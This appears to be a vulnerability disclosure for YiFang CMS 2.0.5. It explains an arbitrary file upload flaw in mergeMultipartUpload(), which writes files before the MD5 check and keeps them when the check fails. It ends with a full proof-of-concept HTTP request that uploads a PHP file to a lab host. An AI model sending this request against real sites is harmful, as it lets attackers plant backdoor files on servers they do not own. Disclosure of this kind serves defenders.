# Vendor

YiFang

# Product

YiFang CMS

# version

 2.0.5

# Download 

https://www.yifangcms.com

# Vulnerability

Yifang latest version 2.0.5 can be uploaded at any file

# Description

File path: The core code of the `app/utils/base/plugin/P_file.php` vulnerability is located in the mergeMultipartUpload() method in the above file. The uploaded file name is determined by the suffixes in `md5value` and `name`. Both of these are controllable, resulting in any file upload.

# Analysis

The vulnerability analysis is as follows: File path: `app/utils/base/plugin/P_file.php` The core code of the vulnerability is located in the mergeMultipartUpload() method in the above file. This method is responsible for merging the uploaded file shards into the final file.

The core code of the vulnerability is located in the mergeMultipartUpload() method in the above file. This method has a classic security flaw: first perform unsafe operations (write files), and then perform security checks (MD5 verification).

<img width="772" height="569" alt="image" src="https://github.com/user-attachments/assets/6a123e6b-3a55-4c8f-9dec-41ee548c6257" />

When the MD5 check fails, the program will return an error message that "uploaded package is incomplete", but it forgot to delete the malicious file that has been created. This residual malicious file becomes a permanent backdoor

<img width="1542" height="395" alt="image" src="https://github.com/user-attachments/assets/e795e7e1-4337-4349-a3ce-259706d4e5a3" />

The vulnerability is reproduced as follows:

Upload test We control the file suffix through name and md5value to control the final file name.

<img width="1032" height="814" alt="image" src="https://github.com/user-attachments/assets/f4ec4c27-9623-4114-b690-02cc6901bf31" />

Successfully uploaded

<img width="683" height="200" alt="image" src="https://github.com/user-attachments/assets/90449b3b-5494-4ec7-b55d-b27dbc89ca65" />

Visit the uploaded file to see
<img width="1133" height="1144" alt="image" src="https://github.com/user-attachments/assets/389cfda7-3430-4bbd-9c51-3060bd514dcd" />


# POC
```
POST /api/file/webUploader HTTP/1.1
Host: 192.168.1.88:8081
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRandomString
Cookie: cms_session=r07ge2g66e1ukvc2illl0e7nph
Content-Length: 995

------WebKitFormBoundaryRandomString
Content-Disposition: form-data; name="id"

WU_FILE_0
------WebKitFormBoundaryRandomString
Content-Disposition: form-data; name="name"

1.php
------WebKitFormBoundaryRandomString
Content-Disposition: form-data; name="type"

application/octet-stream
------WebKitFormBoundaryRandomString
Content-Disposition: form-data; name="lastModifiedDate"

Mon, 11 Aug 2025 04:30:00 GMT
------WebKitFormBoundaryRandomString
Content-Disposition: form-data; name="size"

19
------WebKitFormBoundaryRandomString
Content-Disposition: form-data; name="md5value"

123456
------WebKitFormBoundaryRandomString
Content-Disposition: form-data; name="chunk"

0
------WebKitFormBoundaryRandomString
Content-Disposition: form-data; name="chunks"

1
------WebKitFormBoundaryRandomString
Content-Disposition: form-data; name="file"; filename="blob"
Content-Type: application/octet-stream

<?php phpinfo(); ?>

------WebKitFormBoundaryRandomString--
```
